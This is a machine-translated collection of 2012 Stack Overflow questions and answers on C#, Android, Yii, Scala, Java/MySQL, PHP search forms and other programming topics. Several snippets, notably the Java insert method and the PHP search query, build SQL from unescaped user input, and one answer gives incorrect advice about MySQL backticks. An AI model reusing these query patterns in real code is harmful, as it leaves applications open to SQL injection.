        }
    }

    public static void main(String[] args) {
        test(new FirstCounter());
        test(new SecondCounter());
    }
} 
```

只是为了教育，正则表达式方法可能很好。整个解决方案需要一行 Ruby `hand.split(/[\-\/ ]/, -1).length - 1`，.

# c#-3.0 - 如何在.net的桌面应用程序中创建exe？

> ID：11806378
> 
> 赞同：0
> 
> 时间：2012-08-04T06:09:04.667
> 
> 标签：c#-3.0, c#-2.0

我想为我的 C# 桌面应用程序创建一个 exe。

其实我不知道怎么创作。

所以请给我一些指导。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:13:53.303

在 Visual Studio 中，右键单击解决方案资源管理器下的您的项目，构建您的项目，查看是否有任何错误，

**第1步**

右键 Clk 解决方案资源管理器和`new project` **-->>** `SetUp and Development` **-->>** `Setup Project`

![在此处输入图像描述](../Images/372b8e0bac5bd661fa93701f10f29a0c.png)

**第2步**

对`project Setup` **-->>** `Add` **-->>** `Project Output`

![在此处输入图像描述](../Images/f02435c371e0e1ff76838955221637d1.png)

**第 3 步**

在对话框中选择**Primary Output**并单击确定。

![在此处输入图像描述](../Images/c8ecd464cffcaca896262dc9592b66b7.png)

**第 5 步**

现在在解决方案资源管理器中右键单击您的`Setup project`ie(Setup1) 并选择`Build`，它将创建 exe、msi。

# utf-8 - Yii 和 UTF8 显示，UTF8 与 mysqli 一起使用，但不适用于 yii 后端

> ID：11806382
> 
> 赞同：1
> 
> 时间：2012-08-04T06:09:32.833
> 
> 标签：utf-8, yii

我一直在努力让 Yii 正确显示 utf8，即使我的 apache 服务器和数据库都设置为正确显示它。

更具体地说，我有一组从 mysql 数据库中提取的汉字/假名数据。作为对它的一个简单测试，我设置了一个视图页面，使用 mysqli 和 yii 的 mvc 架构从中提取数据。使用 mysqli 拉取时，它会正确显示，而使用 yii 拉取时则显示不正确。这是来自同一个确切的页面，这也意味着它来自同一个确切的控制器。**我是否错过了强制模型后端使用 utf8 编码的东西？**

图片：http: [//i.imgur.com/BLmrP.png](http://i.imgur.com/BLmrP.png)

这是我在 yii 的 mvc 内容的视图文件中使用的代码：

```
<?php $this->widget('zii.widgets.grid.CGridView', array(
    'dataProvider'=>$dataProvider,
    'enablePagination' => false,
)); ?> 
```

然后 mysqli 就是你所期望的。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T12:34:16.423

您必须指定用于数据库连接的字符集。这是在您的主配置文件中完成的（默认情况下是`protected/config/main.php`），看起来像这样

```
return array(
    ......
    'components'=>array(
        ......
        'db'=>array(
            'connectionString'=>'sqlite:protected/data/source.db',
            'charset'=>'utf8',
        ),
    ),
    ......
); 
```

如果`charset`未明确设置参数，则连接通常是 latin1，这就是您看到乱码的原因。

此外，还有一个[关于正确设置 Unicode 的 wiki 条目](http://www.yiiframework.com/wiki/16/how-to-set-up-unicode/)。

# android - 如何检测布局错误？

> ID：11806387
> 
> 赞同：0
> 
> 时间：2012-08-04T06:10:01.610
> 
> 标签：android

如何检测布局错误？如果我启动 Eclipse 并打开第一个带有布局的 Activity。但是第一个 Activity.java 文件在使用最新的 Sdk API 16 的 SetContentView(R.layout.main) .am 中给出了一些错误。

```
package com.eConnect.Restaurant;

import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;

public class LoginActivity extends Activity {

  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
  }

  @Override
  public boolean onCreateOptionsMenu(Menu menu) {
     getMenuInflater().inflate(R.menu.main, menu);
     return true;
  }
} 
```

主.xml：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
  android:id="@+id/LinearLayout1"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent"
  android:background="#000000"
  android:orientation="vertical" >

  <ImageView
    android:id="@+id/imageView1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="15dip"
    android:contentDescription="@string/desc"
    android:src="@drawable/econnect_logo" />

<TextView
    android:id="@+id/textView1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="15dip"
    android:text="@string/uid"
    android:textAppearance="?android:attr/textAppearanceLarge" />

<EditText
    android:id="@+id/editText1"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="15dip"
    android:background="#ffffff"
    android:hint="@string/uid"
    android:inputType="number"
    android:textColor="#9966cc" >

    <requestFocus />
</EditText>

<TextView
    android:id="@+id/textView2"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="15dip"
    android:text="@string/PW"
    android:textAppearance="?android:attr/textAppearanceLarge" />

<EditText
    android:id="@+id/editText2"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="15dip"
    android:background="#ffffff"
    android:hint="@string/PW"
    android:inputType="numberPassword"
    android:textColor="#9966cc" />

<TextView
    android:id="@+id/textView3"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="15dip"
    android:textAppearance="?android:attr/textAppearanceLarge"
    android:textColor="#ff0000"
    android:textStyle="bold" />

<Button
    android:id="@+id/button1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="15dip"
    android:background="#cccccc"
    android:text="@string/bt"
    android:textColor="#006600"
    android:textStyle="bold" /> 
```

androidmanifest.xml：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
  package="com.eConnect.Restaurant"
  android:versionCode="1"
  android:versionName="1.0" >

  <uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="15" />

  <application
     android:icon="@drawable/ic_launcher"
     android:label="@string/app_name"
     android:theme="@style/AppTheme" >
     <activity
        android:name=".LoginActivity"
        android:label="@string/title_activity_login" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
  </application>

</manifest> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:42:04.833

首先清理你的项目。通过使用项目>清理。你必须做的另一件事是从列表中删除 R.Java。再次清理项目。试试这个，让我知道。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:22:17.350

构建你的项目一次。我也面临这个问题，但是当我构建我的项目时，错误消失了

# iphone - iPhone App - 创建具有不同 Bundle Identifier 的应用程序的副本

> ID：11806389
> 
> 赞同：0
> 
> 时间：2012-08-04T06:10:33.247
> 
> 标签：iphone, xcode, clone

我有一个应用程序-具有某些功能，并且该应用程序与我计划构建的另一个应用程序之间唯一不同的是 sqlite 数据库-这是克隆整个应用程序的最简单方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T06:15:28.490

在 Xcode 中复制目标并更改其捆绑 ID。

# visual-studio-2010 - AnkhSVN 提交冲突

> ID：11806393
> 
> 赞同：1
> 
> 时间：2012-08-04T06:11:05.003
> 
> 标签：visual-studio-2010, svn, tortoisesvn, ankhsvn, svncommit

我们有多个开发人员在一个 Web 应用程序/项目上工作。为此，我们使用 AnkhSVN。

其中一位开发人员进行了一些更改并提交了该项目。几天后，团队中的另一位开发人员进行了一些更改并进行了提交。

之后，第一个开发者的改动就消失了。第二个开发人员的更改覆盖了第一个开发人员的更改。

如何恢复？如何保持两个更新？

请具体。**这个话题的解决非常重要。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T18:32:20.797

实际上，当您不是最新的时，您无法提交更改。我猜第二个提交者做了坏事......所以现在的问题是让两个更改“死后”合并。

为了恢复我会尝试（假设我正确理解了你所做的；这是有根据的推测，因为我没有尝试过）：

1.  将当前状态（没有 .svn 文件夹！）复制到一个临时文件夹中 - 这应该是提交者 2 对初始状态的更改
2.  回滚到第一个提交*之前*的修订版（“更新到修订版”） - 即他们都（可能）开始的版本
3.  复制临时文件夹中的更改
4.  在第一个提交后更新到修订。这应该尝试合并更改，并且可能会带来一些您需要手动解决的冲突（这可能是第 2 项出错的地方）。 **在此之后，您应该在工作副本中进行这两项更改。**
5.  清除临时文件夹并复制当前状态（再次没有 .svn 文件夹）
6.  现在我们变得丑陋了：更新到 HEAD 修订版并复制回更改
7.  检查你是否有一些有意义的东西（编译）并提交。

请记住，除非您破坏了存储库，否则您不能真正丢失任何东西-毕竟这是版本控制... :-)

# scala - 如何使用 Scala 泛型做到这一点

> ID：11806394
> 
> 赞同：1
> 
> 时间：2012-08-04T06:11:04.587
> 
> 标签：scala

目前我有几种非常相似的方法，我想将它们合并为一种方法。这里有2个方法

```
 def toInt(attrType: String, attrValue: String): Int = {
    attrType match {
      case "N" => attrValue.toInt
      case _ => -1
    }
  }

  def toString(attrType: String, attrValue: String): String = {
    attrType match {
      case "S" => attrValue
      case _ => ""
    }
  } 
```

我在想有一种更简单的方法可以在 Scala 中使用泛型来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T07:24:05.817

您可以执行以下操作：

```
trait Converter[T] {
  def convert(attrType: String, attrValue: String): T
}

object ConverterTest {

  implicit object IntConverter extends Converter[Int] {
    def convert(attrType: String, attrValue: String): Int = {
      attrType match {
        case "N" => attrValue.toInt
        case _ => -1
      }
    }
  }

  implicit object StringConverter extends Converter[String] {
    def convert(attrType: String, attrValue: String): String = {
      attrType match {
        case "S" => attrValue
        case _ => ""
      }
    }
  }

  def to[T: Converter](attrType: String, attrValue: String): T = {
    implicitly[Converter[T]].convert(attrType, attrValue)
  }

  def main(args: Array[String]) {
    println(to[String]("S", "B"))
    println(to[String]("N", "B"))

    println(to[Int]("S", "23"))
    println(to[Int]("N", "23"))
  }
} 
```

它的代码更多，我无法让类型推断起作用，因此它的用途可能有限。

但它是一个单一的方法加上一堆可以在呼叫现场控制的转换器，因此您可以获得一些额外的灵活性。

值得付出努力吗？取决于实际用例。

# java - 尝试将数据插入 Mysql 表不起作用（Java）

> ID：11806399
> 
> 赞同：0
> 
> 时间：2012-08-04T06:13:17.043
> 
> 标签：java, mysql, jdbc, prepared-statement

鉴于此代码：

```
package db;
import java.io.*;
import java.sql.*;

public class Connect 
{

    // creating a table for each type person in the bank 

    public void createTable(Statement state,String tableType) throws SQLException
    {
        state.executeUpdate (

                "CREATE TABLE IF NOT EXISTS "+ tableType +" ("
                + "FirstName CHAR(20), LastName CHAR(20),"
                + "Address CHAR(50), PhoneNumber CHAR(20),"
                + "UserName CHAR(20), Password CHAR(20))");
    }

    public void insertDataToTable(Statement statement , String table 
            ,String firstName,String lastName,String address, String phoneNumber , String userName, String password)
    {
        try
        {
            statement.executeUpdate("INSERT INTO table (`FirstName` ,`LastName` , `Address` , `PhoneNumber` , `UserName` , `Password`) " +
                    "values ( '"+firstName+"','"+lastName+ "','"+address+"','"+phoneNumber+"','"+userName+ "'," +password+")");

        }

        catch(Exception e)
        {
            System.out.println(e.toString());
        }

    }

    public void start()
    {

        System.out.println("Database creation example!");
        Connection con = null;
        try
        {
            Class.forName("com.mysql.jdbc.Driver");
            con = DriverManager.getConnection("jdbc:mysql://localhost","root","root");
            try
            {

                Statement st = con.createStatement();

                // create a database 

                st.executeUpdate("CREATE DATABASE IF NOT EXISTS Personnel"); 
                st.executeUpdate("USE Personnel");

                // create tables

                //Create a table for each user type!
                createTable(st, "ClientsTable");
                createTable(st, "ClerksTable");
                createTable(st, "ManagersTable");
                createTable(st, "AdminsTable");

                this.insertDataToTable(st, "ClientsTable", "my", "name", "is", "erl", "I", "think");

                ResultSet rs = st.executeQuery("SELECT `FirstName` FROM `ClientsTable`");
                while (rs.next() == true)
                { 
                    System.out.println(rs.getString("FirstName")); 
                }

            } // end try  

            catch (SQLException s)
            {
                System.out.println("SQL statement is not executed!");
            }

        } // end try 

        catch (Exception e){
            e.printStackTrace();
        }

    }  // end start

} 
```

当我从我的 Main 执行时：

```
package db;

public class Main {

    public static void main(String [ ] args)
    {

        Connect myConnection = new Connect();

        myConnection.start();
    }

} 
```

并在方法中达到该行`start()`：

```
this.insertDataToTable(st, "ClientsTable", "my", "name", "is", "erl", "I", "think"); 
```

我从服务器获得以下输出（使用 try/catch）：

```
com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'table (`FirstName` ,`LastName` , `Address` , `PhoneNumber` , `UserName` , `Passw' at line 1 
```

我查了手册，但似乎找不到问题的根源。知道这里有什么问题吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:20:39.007

我相信你的表名是一个变量。但是，您直接使用了字符串“表”。但这不是问题。

您的`password`变量值需要单引号。

```
"values ( '"+firstName+"','"+lastName+ "','"+address+"','"+phoneNumber+"','"+userName+ "','" +password+"')"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T06:21:11.440

您在列名周围使用波浪号“`”而不是引号“'”。

由于您没有任何分隔符，您可以从列名中删除所有波浪号/引号，或者将它们全部替换为引号“'”

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-04T06:23:32.717

请注意，语句中缺少您的表名。

```
statement.executeUpdate("INSERT INTO table ( 
```

改用以下

```
statement.executeUpdate("INSERT INTO `" + table + "` ( 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T11:34:19.957

在您的价值观中，密码未包含在引号内。密码是字符串，但您的代码将其视为数字。

# r - getURL 和 downfile.file 不会下载网页内容 (R)

> ID：11806404
> 
> 赞同：2
> 
> 时间：2012-08-04T06:14:22.403
> 
> 标签：r, geturl

目前我正在研究 R 中的“getURL”和“download.file”命令。到目前为止，两者都像一个魅力。

但是，我有一个特定链接的问题，我不知道为什么这个链接不起作用。

跑步

```
getURL
("http://www.r-bloggers.com/improving-script_002-%e2%80%9cmonitor%e2%80%9d/") 
```

产生错误：

> curlPerform 中的错误（curl = curl，.opts = opts，.encoding = .encoding）：在字符串中嵌入 nul：'\037\b'

“download.file”命令还创建了一个奇怪的编码文件：

```
download.file
("http://www.r-bloggers.com/improving-script_002-%e2%80%9cmonitor%e2%80%9d/",
"test.html") 
```

这对你有用吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-04T07:43:59.397

问题是 URL 中的引号。您需要先对其进行编码。这将正常工作。

```
getURL(URLencode("http://www.r-bloggers.com/improving-script_002-%E2%80%9Cmonitor%E2%80%9D/")) 
```

# java - 如何在发出 Web 请求的 Heroku Java 应用程序中运行定期进程

> ID：11806410
> 
> 赞同：3
> 
> 时间：2012-08-04T06:15:29.517
> 
> 标签：java, heroku

根据我对 Heroku 平台的理解，每个应用程序只允许一个 dyno 可以处理 HTTP 请求。在 Java 应用程序中，我的目标是每天运行一次或两次定期进程，从 Facebook 服务器获取信息并进行相应处理。如果后台工作人员 dyno 无法处理 Web 请求，那么我应该如何在 Web dyno 中编写一个重复发生的进程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T14:30:04.963

从这个意义上说，“处理 HTTP 请求”是指连接的侦听端而不是发送端。在 Heroku 上，一个应用程序可以有一个 Web 进程* 来监听 HTTP 连接和许多其他发起/发送 HTTP 请求（或连接到其他非 HTTP 系统）的进​​程。

**注意：您可以根据需要分配尽可能多的 Dynos 来运行每个进程。*

要运行定期向外部服务（如 Facebook）发出请求的进程，您可以使用[Heroku Scheduler Add-on](https://addons.heroku.com/scheduler)。然后，您可以将结果存储在许多[关系或 NoSQL 数据存储插件之一中，或者可能通过](http://addons.heroku.com)[CloudAMQP](https://addons.heroku.com/cloudamqp)等消息传递插件将结果发送到其他进程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:30:33.367

如果平台限制了你，为什么要使用它？
还有其他平台可以让您执行此操作。[您可以使用OpenShift](https://openshift.redhat.com/app/)轻松地将 Java 应用程序部署到云端，然后就我所知，您可以毫无限制地使用 Java API。
OpenShift 也使用 git，与 Heroku 一样。
它们都是 PaaS，所以概念完全一样，我认为您可以轻松尝试 OpenShift。
您还可以查看 Google App Engine 是否有此类限制。
很抱歉没有帮助您解决具体问题，我只知道至少“一个竞争对手”没有这样的限制。

# c# - 在 Windows 上发送原始以太网 II 帧时必须提供 FCS 吗？

> ID：11806413
> 
> 赞同：1
> 
> 时间：2012-08-04T06:16:18.697
> 
> 标签：c#, windows, sockets, ethernet

我正在构建以太网 II 帧、IPv4 数据包，最后是带有有效负载的 TCP 部分。从头开始，创建原始数据包。

我的问题是......在 Windows 上使用 C# 和原始套接字时，我需要在数据包末尾提供 FCS 吗？

我的理解是 Windows 会自动执行此操作，但专门针对以太网帧而不是 IP 或 TCP 数据包。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T01:34:12.800

事实证明，网络接口卡在传输时自动添加并在接收时剥离。操作系统根本不需要处理它，并且通常无法访问它。

# c# - asp.net 身份验证和授权

> ID：11806414
> 
> 赞同：0
> 
> 时间：2012-08-04T06:16:29.383
> 
> 标签：c#, asp.net

我正在使用表单身份验证。在这里，我使用登录控件，在 (login.cs) 控件中，我正在调用以下方法来验证用户。在这里，我使用本地名称作为用户名和密码，现在我想连接到数据库，以便检索用户名和密码。

```
private bool Authenticateme(string username, string password, bool remberusername)
{
    String localusername = "username";
    String localpassword = "amar";
    if (username.Equals(localusername) && password.Equals(localpassword))
    {
        return true;
    }
    else
    {
        return false;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T06:23:19.187

您可以使用[MemberShip 和 Role Providers](http://msdn.microsoft.com/en-us/library/aa354509.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:25:58.517

您需要`OnAuthenticate`像这样添加它来实现：

```
<asp:Login OnAuthenticate="AuthenticateEventHandler" />
```

像这样在 .cs 文件中添加事件处理程序

```
private void OnAuthenticate(object sender, AuthenticateEventArgs e)
{
    bool Authenticated = false;
    Authenticated = SiteSpecificAuthenticationMethod(Login1.UserName, Login1.Password);

    e.Authenticated = Authenticated;
}
```

实现`SiteSpecificAuthenticationMethod`将根据数据库验证用户。

以下是参考链接：

1.  [http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.login.authenticate.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.login.authenticate.aspx)
2.  [http://forums.asp.net/t/1403132.aspx](http://forums.asp.net/t/1403132.aspx)

如果您需要更多帮助，请告诉我。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-04T06:50:51.550

尝试以下操作并使用字段用户名和密码创建 SQL Server 数据库

```
SQlConnection con = new SqlConnection("Database connection string");
const string uName="UserName";
const string pWord="Password";
public bool getAuthenticate(string UserName,string Password)
{
    con.Open();

    SqlCommand cmd = new SqlCommand(con);
    SQlParameter[] param=new SqlParameter[]{
         new SqlParamter(uName,UserName),
         new SqlParameter(pWord,Password)
    };
    cmd.Parameters.AddRanage(param);
    SqlDataReader rd;
    rd = cmd.executeReader();

    if(rd.read())
    {
         con.Close();
         return true;
    }
    else
    {
         con.Close();
         return false;
    }
} 
```

# ruby-on-rails - ArgumentError：已请求 SMTP-AUTH 但缺少用户名 + ActionMailer

> ID：11806416
> 
> 赞同：5
> 
> 时间：2012-08-04T06:16:35.570
> 
> 标签：ruby-on-rails, smtp, actionmailer, telnet, mailer

每次我尝试使用 actionmailer 发送邮件时，我都无法使用 actionmailer 发送邮件 它报告我有错误

ArgumentError：已请求 SMTP-AUTH 但缺少用户名

这很奇怪，因为我可以通过 Telnet 发送邮件但不能使用 ActionMailer

附加 Telnet 截图

这是我的 SMTP 设置

```
config.action_mailer.delivery_method = :smtp

config.action_mailer.smtp_settings = {
    :address => '216.224.183.100',
    :port                 => 25,
    :domain               => '[domain_name]',
    :username             => "[username]",
    :password             => "[password]",
    :authentication       => 'plain',
   :enable_starttls_auto => true
 } 
```

任何人都可以通过邮件告知未发送

![在此处输入图像描述](../Images/b42aa950179db5d5ed0cc6bd753ee610.png)

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-04T11:56:12.177

知道了。是`user_name`，不是`username`。

# c# - 使用 C# 以选定的延迟从外部设备询问数据

> ID：11806419
> 
> 赞同：0
> 
> 时间：2012-08-04T06:17:28.160
> 
> 标签：c#

```
private void timer1_Tick(object sender, EventArgs e)
{        
   string[] DF_Engines = { Form2.Engine1, Form2.Engine2, Form2.Engine3, Form2.Engine4, Form2.Engine5, Form2.Engine6 };
   foreach (string DF_Engine in DF_Engines)
   {
       if (Convert.ToDouble(DF_Engine) != 99)
       {
           string Hex_ADD1 = "{" + DF_Engine + "|";
           Console.WriteLine(Hex_ADD1);
           serialPort1.Write(Hex_ADD1);
           n = Convert.ToInt16(DF_Engine);               
        }
    }
} 
```

`Form2.Engine1`, `Form2.Engine2`.......`Form2`是选中相应复选框时的值。这些将是 1, 2 , 3 等等....我的代码在选择 checkbox1 时发送 01，但是当在 Form2 中选择 checkbox1 和 checkbox2 时它会毫无延迟地发送 01,02。根据我的兴趣，我在询问 01 和 02 等时需要延迟。我怎么能做到这一点，当我使用时`Thread.Sleep(500)`，应用程序变慢了。需要指导。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T07:02:53.060

您可以考虑使用一个单独的线程，只是一个`BackgroundWorker`控件。这样，您可以使用`Thread.Sleep()`方法并且它不应该使应用程序的 GUI 无响应。您可以在 msdn 上找到有关它的更多信息：http: [//msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)。

只需在表单中添加一个`BackgroundWorker`控件并使用此代码来处理适当的事件：

```
private void timer1_Tick(object sender, EventArgs e)
{
    string[] DF_Engines = { Form2.Engine1, Form2.Engine2, Form2.Engine3, Form2.Engine4, Form2.Engine5, Form2.Engine6 };

    //disable timer1, so it wont tick again until the current work is finished
    timer1.Stop();

    //start processing asynchronously, so GUI is still responsive
    sampleBackgroundWorker.RunWorkerAsync(DF_Engines);
}

//this method should be attached to DoWork event of the BackgroundWorker
private void sampleBackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
{
    string[] DF_Engines = (e.Argument as string[]);

    foreach (string DF_Engine in DF_Engines)
    {
        if (Convert.ToDouble(DF_Engine) != 99)
        {
            string Hex_ADD1 = "{" + DF_Engine + "|";
            Console.WriteLine(Hex_ADD1);
            serialPort1.Write(Hex_ADD1);
            //n gets overwritten in each iteration, is this line required?
            n = Convert.ToInt16(DF_Engine);

            Thread.Sleep(500);
        }
    }

    //you can also pass a result from this method back to the GUI thread like this
    //e.Result = "job done";
    //this can be read later in RunWorkerCompleted method of the BackgroundWorker
}

//this method should be attached to RunWorkerCompleted event of the BackgroundWorker
private void sampleBackgroundWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
{
    //start timer1, so it can invoke the worker again
    timer1.Start();
} 
```

如果您需要更多帮助，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:03:42.490

不要在 UI 线程上使用 Thread.Sleep。它肯定会减慢您的应用程序。而是启动一个新线程，将数据传递给该线程并让该线程延迟将输入发送到您的应用程序。

```
System.Threading.Thread thread = new System.Threading.Thread((inputList) =>
    {
       foreach (var input in inputList as IEnumerable<int>)
       {
          //Send input
          System.Threading.Thread.Sleep(500);
        }
      });
  thread.Start(); 
```

其中 inputList 是一个数据数组（1,2 等，具体取决于您选择的复选框）。

# php - 使用多变量 PHP MySQL 创建表搜索功能

> ID：11806421
> 
> 赞同：0
> 
> 时间：2012-08-04T06:18:12.550
> 
> 标签：php, mysql, search

我正在尝试创建一个具有多个变量的搜索函数。基本上我有一个标准的样式形式，每个元素都有一个名字。`POST`通过然后进行搜索查询来检索提交上的那些名称。我已经发布了我的代码，我知道我可能已经采取了一种糟糕的方式，但我正在寻找如何使其适合的方向。对 PHP 来说仍然很新，所以关于更好的构建它的方法的建议，我可以去学习/实施。目前它确实通过第一个变量进行搜索`$search`但我不确定如何实现其余的。用户应该能够输入 1 个或多个变量然后进行搜索。此时它只搜索一个表，我希望它长期搜索多个表，不同表中的所有列都具有相同的名称，只是不同的数据。任何指导在这里表示赞赏。干杯。

```
//define variables to be used
$table = 'aecm';
$search = @$_POST['search'];
$status = @$_POST['status'];
$repair = @$_POST['repair'];
$upgrade = @$_POST['um'];
$pm = @$_POST['pm'];
$nofault = @$_POST['nf'];

//Connect to database
include '/../connect.php';

//conduct a search
$result = mysql_query("SELECT * FROM $table
WHERE (part LIKE '%$search%')
OR
(serial LIKE '%$search%')
OR
(mac LIKE '%$search%')
OR
(ip LIKE '%$search%')
OR
(status LIKE '%$search%')
ORDER BY part ASC");
if (!$result) {
die("Query to show fields from table failed");
} 
```

添加了显示变量的表单代码。

```
echo '<form ENCTYPE=multipart/form-data form name=benchsearch 
action=benchsearchresults.php method=post>';

//search selection
echo '<table>';
echo '<tr><td>Standard Search  </td>';
echo "<td><input type=text maxlength=30 name=search /></td>";
echo '<tr><td>Search Status of Equipment  </td>';
echo "<td><select name=status>";
echo "<option>  </option>";
echo "<option> SERVICEABLE </option>";
echo "<option> UNSERVICEABLE </option>";
echo "<option> BEYOND ECONOMICAL REPAIR </option></select></td>";
echo "<tr><td>Search Type of Repair :</td>";
echo "<tr><td>Repair </td>";
echo "<td><input type=checkbox name=repair value=rep /></td>";
echo "<tr><td>Updrade/Modification </td>";
echo "<td><input type=checkbox name=upgrade value=um /></td>";
echo "<tr><td>Preventitive Maintenance Check </td>";
echo "<td><input type=checkbox name=pm value=pm /></td>";
echo "<tr><td>No Fault Found </td>";
echo "<td><input type=checkbox name=nofault value=nf /></td>";
echo "</table>";
echo '<center><input type="submit" class="button" id="submit" value="Search"/>    </center>';
echo "</form>"; 
```

我的表格如下

表 aecm、aicm 等列 - 部分、序列、mac、ip、状态

表 aecmhis、aicmhis 等列 - 串行、修复、升级、pm、nofault

我想使用上述表格（或类似表格）进行搜索并显示所有表格的结果。序列号在 aecm-aecmhis 和 aicm-aicmhis 等之间是通用的。状态只是 3 个选项中的 1 个，修复、升级、pm、nofault 列要么为空，要么包含`yes`在其中。只是在寻找解决这个问题的最佳方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:29:01.357

为什么不将表格作为参数，我的意思是使用 post 让用户指定他们想要搜索的表格，其余代码可以保持不变。我不太确定我是否了解您真正需要的东西，所以如果这不是您想要的，请告诉我

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:58:10.703

如果您希望能够在每次搜索时使用多个查询词查询多个表，那么*sql*并不是最好的解决方案。像[Apache Lucene](http://lucene.apache.org/core/)这样的东西可能是一个开始寻找的地方。我知道[Zend Framework](http://framework.zend.com/manual/en/zend.search.lucene.html)有一个实现索引 Lucene 搜索引擎的组件，并且可能是一个开始的地方（您可以只使用 ZF 所需的组件）。

PS这不简单！

祝你好运。

# android - 片段交易、操作栏和后台堆栈

> ID：11806423
> 
> 赞同：7
> 
> 时间：2012-08-04T06:18:35.587
> 
> 标签：android, android-fragments, android-actionbar

在我的主要活动中，我有一个带有`NAVIGATION_MODE_TABS`. 每个选项卡的内容是一个列表片段。

我想这样做，以便在单击列表项时，会看到一个新片段，并且将操作栏模式更改为`NAVIGATION_MODE_STANDARD`（以便现在隐藏选项卡）。

我已经设法让它与以下代码一起工作：

在 listitemclick 方法中：

```
 ActionBar actionBar = getActivity().getActionBar();
        actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_STANDARD);

        Fragment albumListFragment = new AlbumListFragment();
        albumListFragment.setArguments(bundle);
        FragmentTransaction ft = getFragmentManager().beginTransaction();

        ft.replace(android.R.id.content, albumListFragment);
        ft.addToBackStack(null);

        // Commit the transaction
        ft.commit();

        Log.i("FragmentList", "Item clicked: " + id); 
```

问题是当我按下后退按钮时，选项卡仍然消失，并且前一个片段不会重新出现。

我做错了什么..它与片段后栈有关吗？我应该以另一种方式去做，甚至覆盖背压吗？

- 编辑 -

为清楚起见 - 我在调用 fragmenttransaction.replace 时调用 addToBackStack，但是当我按下后退按钮时，前一个片段不会恢复。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-13T12:02:18.103

也许这有点晚了，我试图重建你的问题几个小时但没有成功。我尝试按照您的问题中描述的方式（即 ft.replace(android.R.id.content, albumListFragment);）从 ActionBar Tab 托管的片段中的列表视图切换到另一个视图，但没有效果。经过一些谷歌和stackoverflow，我使用[这种方式](http://www.lucazanini.eu/2013/android/how-to-replace-a-fragment-in-an-actionbar-in-mode-navigation_mode_tabs/)成功地在选项卡内切换片段，但没有任何问题。

**由于“操作栏未正确显示”问题，可能是由于**[android developer guide](http://developer.android.com/training/implementing-navigation/temporal.html#back-fragments)中描述的 backstack revert 和 UI 更改引起的。您可能会尝试覆盖 onBackStackChanged() 回调并重新构建 UI。

**由于“backstack 不会带回之前的片段”问题**，您可能想多发一点代码来帮助其他人重新构建问题以找到答案。

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-11T09:24:58.467

我遇到了完全相同的问题，并发现只有将 ActionBar 设置回 NAVIGATION_MODE_STANDARD 时才会出现问题。

对我来说唯一的解决方案是将没有选项卡的新片段放在具有 NAVIGATION_MODE_STANDARD 的辅助活动中。然后，您可以轻松地使用 Android 提供的后退按钮功能返回到带有 NAVIGATION_MODE_TABS 的活动并保留其状态。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-22T05:18:25.787

[FragmentTransaction.replace()](http://developer.android.com/reference/android/app/FragmentTransaction.html#replace%28int,%20android.app.Fragment,%20java.lang.String%29)实际上删除布局中的前一个片段并添加片段的新实例。

